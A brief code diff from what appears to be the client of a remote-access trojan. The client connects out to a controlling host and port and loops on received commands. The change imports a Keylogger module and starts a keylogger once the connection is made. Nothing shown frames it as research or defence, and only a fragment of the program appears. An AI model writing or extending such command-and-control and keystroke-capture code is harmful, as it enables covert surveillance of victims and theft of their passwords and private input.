@@ -1,6 +1,6 @@
-import socket, subprocess, os, base64
+import socket, os
 from client_commands import *
-
+from keylogger import Keylogger
 
 def run(host, port):
     try:
@@ -9,6 +9,8 @@ def run(host, port):
             client_socket.connect((host, port))
         except:
             return
+        
+        klogger = Keylogger()
         while True:
             command = client_socket.recv()
             if command == "exit":
